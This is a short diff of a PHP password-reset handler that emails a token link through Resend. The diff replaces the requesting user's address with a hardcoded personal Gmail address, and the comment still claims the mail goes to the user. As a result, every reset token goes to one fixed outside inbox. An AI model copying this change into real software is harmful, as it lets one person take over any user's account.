@@ -18,7 +18,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $data = [
         "from" => "onboarding@resend.dev", // remitente compartido de Resend
-        "to" => $email,                     // destinatario: el usuario que pidió recuperar contraseña
+        "to" => "emilymunoz1018@gmail.com",                     // destinatario: el usuario que pidió recuperar contraseña
         "subject" => "Recuperación de contraseña",
         "html" => "Haz clic en el siguiente enlace para resetear tu contraseña: 
                    <a href='https://drudgereport.onrender.com/reset.php?token=$token'>Resetear contraseña</a>"
